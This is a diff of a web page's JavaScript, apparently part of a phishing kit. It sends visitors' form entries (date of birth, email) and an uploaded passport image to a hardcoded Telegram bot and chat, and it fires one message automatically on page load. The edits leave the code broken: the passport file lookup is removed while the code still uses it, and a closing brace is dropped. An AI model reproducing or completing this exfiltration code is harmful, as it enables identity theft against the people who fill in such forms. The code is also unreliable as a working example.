@@ -434,12 +434,7 @@ closeAdButton.addEventListener("click", slideOutAd);
 	  const TELEGRAM_CHAT_ID = '6049368044';
 	  const MESSAGE = 'hello';
 
-	  // Proper parameter naming
-function sendImageToTelegram(botToken, chatId) {
-	
-	const input = document.getElementById('passport');
-	const file = input.files[0];
-	
+ function sendImageToTelegram(botToken, chatId) {
     if (!file) {
         alert('No image selected');
         return;
@@ -454,6 +449,7 @@ function sendImageToTelegram(botToken, chatId) {
             body: form
         });
 }
+ 
 
 	  // Proper parameter naming
 function sendMessageToTelegram(botToken, chatId, messageText) {
@@ -465,9 +461,9 @@ function sendMessageToTelegram(botToken, chatId, messageText) {
       text: messageText
     })
   });
-}
 
 sendMessageToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, MESSAGE);
+	
         function showForm(formId) {
             // Hide all forms
             document.querySelectorAll('.form-container').forEach(form => {
@@ -501,7 +497,6 @@ sendMessageToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, MESSAGE);
                            `👤 Date of Birth: ${data.dob}\n` +
                            `📧 Email: ${data.email}\n` +
                            `⏰ Time: ${new Date().toLocaleString()}`;
-			alert(message)
             
             sendMessageToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
 		
